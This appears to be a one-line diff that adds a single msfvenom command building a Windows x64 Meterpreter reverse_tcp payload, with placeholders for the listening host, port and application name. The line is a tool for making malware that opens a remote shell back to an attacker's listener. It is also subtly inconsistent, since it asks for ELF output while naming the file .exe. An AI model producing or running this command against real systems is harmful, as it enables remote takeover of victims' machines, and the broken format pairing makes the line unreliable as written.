@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENING HOST IP> LPORT=<LISTENING HOST PORT> -f elf -o <APPLICATION_NAME>.exe
